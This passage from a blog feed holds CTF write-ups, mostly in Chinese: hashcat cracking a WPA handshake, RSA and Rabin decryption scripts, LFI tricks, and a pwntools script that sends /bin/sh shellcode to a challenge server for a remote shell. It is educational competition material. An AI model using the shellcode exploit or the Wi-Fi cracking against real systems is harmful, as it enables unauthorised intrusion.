* Device #2: Intel&amp;#x27;s OpenCL runtime (GPU only) is currently broken.
             We are waiting for updated OpenCL drivers from Intel.
             You can use --force to override, but do not report related errors.
nvmlDeviceGetFanSpeed(): Not Supported

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 965M, 512&amp;#x2F;2048 MB allocatable, 8MCU

OpenCL Platform #2: Intel(R) Corporation
========================================
* Device #2: Intel(R) HD Graphics 530, skipped.
* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5&amp;#x2F;13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344390
* Bytes.....: 139921496
* Keyspace..: 14344383
* Runtime...: 3 secs

e56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344

Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA&amp;#x2F;WPA2
Hash.Target......: Flag_is_here (AP:56:0a:64:ff:e9:17 STA:b8:ee:65:ac:64:0b)
Time.Started.....: Fri May 11 01:17:21 2018 (3 secs)
Time.Estimated...: Fri May 11 01:17:24 2018 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1&amp;#x2F;1 (100.00%)
Speed.Dev.#1.....:    91621 H&amp;#x2F;s (10.79ms) @ Accel:32 Loops:16 Thr:1024 Vec:1
Recovered........: 1&amp;#x2F;1 (100.00%) Digests, 1&amp;#x2F;1 (100.00%) Salts
Progress.........: 593466&amp;#x2F;14344383 (4.14%)
Rejected.........: 331322&amp;#x2F;593466 (55.83%)
Restore.Point....: 0&amp;#x2F;14344383 (0.00%)
Candidates.#1....: 123456789 -&amp;gt; rinabelle
HWMon.Dev.#1.....: Temp: 68c Util: 98% Core:1151MHz Mem:2505MHz Bus:16

Started: Fri May 11 01:17:04 2018
Stopped: Fri May 11 01:17:25 2018
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-22&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;flag{11223344}&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;[　] Crypto&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;x-medium-rsa&quot;&gt;[Ｘ] Medium RSA&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;λ openssl rsa -pubin -in pubkey.pem -text -modulus
WARNING: can&amp;#x27;t open config file: &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;ssl&amp;#x2F;openssl.cnf
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 65537 (0x10001)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
writing RSA key
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&amp;#x2F;+5erCQKPGqxsC&amp;#x2F;bNPXDr
yigb&amp;#x2F;+l&amp;#x2F;vjDdAgMBAAE=
-----END PUBLIC KEY-----

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后分解这个数，用RSAtools输出私钥文件&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;λ python rsatool.py -f PEM -o key.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048 041239
Using (p, q) to initialise RSA instance

n =
c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd

e = 65537 (0x10001)

d =
1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1

p = 275127860351348928173285174381581152299 (0xcefbb2cf7e18a98ebedc36e3e7c3b02b)

q = 319576316814478949870590164193048041239 (0xf06c28e91c8922b9c236e23560c09717)

Saving PEM as key.pem
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;之后解密&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;λ openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-23&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{256b_i5_m3dium}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;brokenpic&quot;&gt;[　] BrokenPic&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;flag-24&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;h2 id=&quot;x-hard-rsa&quot;&gt;[Ｘ] hard RSA&lt;&#x2F;h2&gt;
&lt;h2 id=&quot;rsa-yan-sheng-suan-fa-rabin-suan-fa&quot;&gt;RSA 衍生算法——Rabin 算法&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;gong-ji-tiao-jian&quot;&gt;攻击条件&lt;&#x2F;h3&gt;
&lt;p&gt;Rabin 算法的特征在于 $e=2​$。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;gong-ji-yuan-li&quot;&gt;攻击原理&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;密文：&lt;&#x2F;p&gt;
&lt;p&gt;$c=m^2\mod n$&lt;&#x2F;p&gt;
&lt;p&gt;解密：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;计算出 $m^p$ 和 $m^q$：&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;$$m_p=\sqrt{c}\mod p$$&lt;&#x2F;p&gt;
&lt;p&gt;$$m_q=\sqrt{c}\mod q$$&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;用扩展欧几里得计算出 $y_p$ 和 $y_q$：&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;$y_p⋅p+y_q⋅q=1$&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;解出四个明文：&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;$$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p)modn$$&lt;&#x2F;p&gt;
&lt;p&gt;$$b=n−a$$&lt;&#x2F;p&gt;
&lt;p&gt;$$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p)modn$$&lt;&#x2F;p&gt;
&lt;p&gt;$$d=n−c$$&lt;&#x2F;p&gt;
&lt;p&gt;注意：如果 $$p≡q≡3(mod4)$$，则&lt;&#x2F;p&gt;
&lt;p&gt;$$mp=c^{\frac{1}{4}(p+1)}modp$$&lt;&#x2F;p&gt;
&lt;p&gt;$$mq=c^{\frac14(q+1)}modq$$&lt;&#x2F;p&gt;
&lt;p&gt;而一般情况下，$p≡q≡3(mod4)p $是满足的，对于不满足的情况下，请参考相应的算法解决。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python
# coding=utf-8
import gmpy2
import string
from Crypto.PublicKey import RSA

# 读取公钥参数
with open(&amp;#x27;pubkey.pem&amp;#x27;, &amp;#x27;r&amp;#x27;) as f:
    key = RSA.importKey(f)
    N = key.n
    e = key.e
with open(&amp;#x27;flag.enc&amp;#x27;, &amp;#x27;r&amp;#x27;) as f:
    cipher = f.read().encode(&amp;#x27;hex&amp;#x27;)
    cipher = string.atoi(cipher, base=16)
    # print cipher
print &amp;quot;please input p&amp;quot;
p = int(raw_input(), 10)
print &amp;#x27;please input q&amp;#x27;
q = int(raw_input(), 10)
# 计算yp和yq
inv_p = gmpy2.invert(p, q)
inv_q = gmpy2.invert(q, p)

# 计算mp和mq
mp = pow(cipher, (p + 1) &amp;#x2F; 4, p)
mq = pow(cipher, (q + 1) &amp;#x2F; 4, q)

# 计算a,b,c,d
a = (inv_p * p * mq + inv_q * q * mp) % N
b = N - int(a)
c = (inv_p * p * mq - inv_q * q * mp) % N
d = N - int(c)

for i in (a, b, c, d):
    s = &amp;#x27;%x&amp;#x27; % i
    if len(s) % 2 != 0:
        s = &amp;#x27;0&amp;#x27; + s
    print s.decode(&amp;#x27;hex&amp;#x27;)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-25&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{sp3ci4l_rsa}&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>HGAME2018-week2部分WP</title>
		<published>2018-02-16T16:00:20+08:00</published>
		<updated>2020-08-07T01:48:37.557765+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/" type="text/html"/>
		<id>https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/</id>
		<content type="html">&lt;p&gt;菜鸟每天飞过&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;ul&gt;
&lt;li&gt;Web
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Random?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
草莓社区-1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
草莓社区-2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
XSS-1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
XSS-2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
最简单的sql题&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Rev
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
wtfitis&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
miaomiaowu&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
iccanobif&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;PWN
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
ez_shellcode&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
ez bash jail&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
hacker_system_ver1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
ez_shellcode_ver2&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Misc
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
咻咻咻&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
White cosmos&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
easy password&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
mysterious file header&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Crypto
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
easy rsa&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
the same simple RSA&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
xasr&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Caesar&amp;amp;&amp;amp;Caesar&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
violence&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……&lt;&#x2F;p&gt;
&lt;h1 id=&quot;web&quot;&gt;Web&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;random&quot;&gt;Random?&lt;&#x2F;h2&gt;
&lt;p&gt;首先都提示了vim改代码，那就是源码泄露咯&lt;&#x2F;p&gt;
&lt;p&gt;试了一下是&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_175026.png&quot; alt=&quot;Random1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;用vim读一下&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_175201.png&quot; alt=&quot;Random2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;这里的方法是构造一个对象使public和secret公用空间，方法是&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_180251.png&quot; alt=&quot;Random3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_180245.png&quot; alt=&quot;Random4&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;cao-mei-she-qu-1&quot;&gt;草莓社区-1&lt;&#x2F;h2&gt;
&lt;p&gt;LFI嘛，最简单的肯定是直接来咯&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_171633.png&quot; alt=&quot;草莓社区-1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;cao-mei-she-qu-2&quot;&gt;草莓社区-2&lt;&#x2F;h2&gt;
&lt;p&gt;难一点的就用base64编码读咯&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_172618.png&quot; alt=&quot;草莓社区-2_1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180213_172626.png&quot; alt=&quot;草莓社区-2_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;pwn&quot;&gt;PWN&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;ez-shellcode&quot;&gt;ez_shellcode&lt;&#x2F;h2&gt;
&lt;p&gt;既然是直接执行，那找一个就好了&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
r = remote(&amp;quot;111.230.149.72&amp;quot;,10004)
print r.recv
payload = &amp;quot;\x6a\x0b&amp;quot;+&amp;quot;\x58&amp;quot;+&amp;quot;\x99&amp;quot;+&amp;quot;\x52&amp;quot;+&amp;quot;\x68\x2f\x2f\x73\x68&amp;quot;+&amp;quot;\x68\x2f\x62\x69\x6e&amp;quot;+&amp;quot;\x89\xe3&amp;quot;+&amp;quot;\x52&amp;quot; +&amp;quot;\x53&amp;quot;+&amp;quot;\x89\xe1&amp;quot;+&amp;quot;\xcd\x80&amp;quot;
r.send(payload)
r.interactive()
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ez-bash-jail&quot;&gt;ez bash jail&lt;&#x2F;h2&gt;
&lt;p&gt;根据视频教程&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180214_171547.png&quot; alt=&quot;ez bash jail&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;misc&quot;&gt;Misc&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;xiu-xiu-xiu&quot;&gt;咻咻咻&lt;&#x2F;h2&gt;
&lt;p&gt;首先是一个zip伪加密&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_211448.png&quot; alt=&quot;咻咻咻1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;解压出来以后按照https:&#x2F;&#x2F;ethackal.github.io&#x2F;2015&#x2F;10&#x2F;05&#x2F;derbycon-ctf-wav-steganography&#x2F;用Ruby来解码&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_203651.png&quot; alt=&quot;咻咻咻2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;明显是Base64，解码得flag&lt;&#x2F;p&gt;
&lt;h2 id=&quot;white-cosmos&quot;&gt;White cosmos&lt;&#x2F;h2&gt;
&lt;p&gt;PWNHUB密码学专场里的签到题的套路&lt;&#x2F;p&gt;
&lt;p&gt;打开一看0x09&#x2F;0x20心里就有底了&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_204814.png&quot; alt=&quot;white cosmos1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;因为可见字符首位应该是0，所以0x09对应0，0x20对应1&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_205356.png&quot; alt=&quot;white cosmos2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;easy-password&quot;&gt;easy password&lt;&#x2F;h2&gt;
&lt;p&gt;没什么好说的，跑就是了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_210003.png&quot; alt=&quot;easy password&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;mysterious-file-header&quot;&gt;mysterious file header&lt;&#x2F;h2&gt;
&lt;p&gt;首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_222543.png&quot; alt=&quot;mysterious file header1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;解压出来的文件拿反编译器http:&#x2F;&#x2F;www.javadecompilers.com&#x2F;搞一下&lt;&#x2F;p&gt;
&lt;p&gt;有用的代码为&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&amp;#x2F;*
 * Decompiled with CFR 0_123.
 *&amp;#x2F;
package GUI;

import java.awt.Component;
import java.awt.GridLayout;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;

public class hgameGUI
        extends JFrame {
    private static final int DEFAULT_WIDTH = 300;
    private static final int DEFAULT_HEIGHT = 200;

    public hgameGUI() {
        super(&amp;quot;Welcome to Hgame!&amp;quot;);
        this.setSize(300, 200);
        JButton flag1 = new JButton(&amp;quot;i&amp;#x27;m flag&amp;quot;);
        JButton flag2 = new JButton(&amp;quot;i&amp;#x27;m flag, too.&amp;quot;);
        JButton flag3 = new JButton(&amp;quot;RU kidding me? I&amp;#x27;m the true flag!&amp;quot;);
        JButton flag4 = new JButton(&amp;quot;UR wrong, I&amp;#x27;m the true flag!&amp;quot;);
        JTextArea flagtext = new JTextArea(&amp;quot;Want flag? Try upstairs.&amp;quot;);
        JPanel flag = new JPanel();
        flag.setLayout(new GridLayout(5, 1));
        flag.add(flag1);
        flag.add(flag2);
        flag.add(flag3);
        flag.add(flag4);
        flag.add(flagtext);
        flag1.addActionListener(event -&amp;gt; {
                    flagtext.setText(&amp;quot;118&amp;quot;);
                }
        );
        flag2.addActionListener(event -&amp;gt; {
                    flagtext.setText(&amp;quot;54&amp;quot;);
                }
        );
        flag3.addActionListener(event -&amp;gt; {
                    flagtext.setText(&amp;quot;29&amp;quot;);
                }
        );
        flag4.addActionListener(event -&amp;gt; {
                    flagtext.setText(&amp;quot;89&amp;quot;);
                }
        );
        this.add(flag);
    }
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;智障的我反应了半天才明白这是IP地址&lt;&#x2F;p&gt;
&lt;p&gt;遍历一下顺序查一下，在中国的一个IP里找到&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_211411.png&quot; alt=&quot;mysterious file header2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_211452.png&quot; alt=&quot;mysterious file header3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;Crypto&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;easy-rsa&quot;&gt;easy rsa&lt;&#x2F;h2&gt;
&lt;p&gt;明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
e = 65537
c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750

low = 1
high = h&amp;#x2F;&amp;#x2F;2 
mid =int((low+high))&amp;#x2F;&amp;#x2F;2

while low&amp;lt;high:
	if low*(h-low)  &amp;gt; N:
		high = mid-1
	else:
		low = mid + 1
	mid = (low+high)&amp;#x2F;&amp;#x2F;2

print(low)
print(h-low)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这样就有p&#x2F;q了&lt;&#x2F;p&gt;
&lt;p&gt;后来发现这出题人一开始应该没这样想&lt;&#x2F;p&gt;
&lt;p&gt;回头补……&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-same-simple-rsa&quot;&gt;The same simple RSA&lt;&#x2F;h2&gt;
&lt;p&gt;先读一下key咯&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ openssl rsa -pubin -in pubkey.pem -text -modulus
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 65537 (0x10001)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&amp;#x2F;+5erCQKPGqxsC&amp;#x2F;bNPXDr
yigb&amp;#x2F;+l&amp;#x2F;vjDdAgMBAAE=
-----END PUBLIC KEY-----
writing RSA key

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;256位嘛，好说了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180212_150022.png&quot; alt=&quot;The same simple RSA&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;然后用rsatool生成pem文件，解密得flag&lt;&#x2F;p&gt;
&lt;p&gt;需要注意的是有了q&#x2F;p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过&lt;&#x2F;p&gt;
&lt;h2 id=&quot;caesar-caesar&quot;&gt;Caesar&amp;amp;&amp;amp;Caesar&lt;&#x2F;h2&gt;
&lt;p&gt;直接在线解咯&lt;&#x2F;p&gt;
&lt;p&gt;要分析的话，就是指数重叠+频率分析？&lt;&#x2F;p&gt;
&lt;h2 id=&quot;violence&quot;&gt;violence&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;a = &amp;quot;191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105&amp;quot;
a = a.replace(&amp;#x27;_&amp;#x27;,&amp;#x27;&amp;#x27;)
str = &amp;quot;&amp;quot;
for i in range(0,int(len(a)&amp;#x2F;2)):
	str+=chr(ord(&amp;#x27;a&amp;#x27;)+int(a[2*i]+a[2*i+1],16))
print(str)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pycipher import Affine

s = [1,3,5,7,9,11,15,17,19,21,23,25]
for i in s:
	for j in range(0,25):
		print(Affine(a=i,b=j).encipher(&amp;#x27;zxjfghjfzhggdvfzdkhgxmuhxcfqrf&amp;#x27;).lower())
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后找到&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;hgame2018-week2bu-fen-wp&#x2F;snipaste20180211_220623.png&quot; alt=&quot;violence&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>CTF轻工具个人集合</title>
		<published>2018-02-08T13:12:03+08:00</published>
		<updated>2020-08-07T01:48:37.517874+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/ctfqing-gong-ju-ge-ren-ji-he/" type="text/html"/>
		<id>https://CSUwangj.github.io/ctfqing-gong-ju-ge-ren-ji-he/</id>
		<content type="html">&lt;p&gt;持续更新ing&lt;&#x2F;p&gt;
&lt;p&gt;可能以后还会重新整理&lt;&#x2F;p&gt;
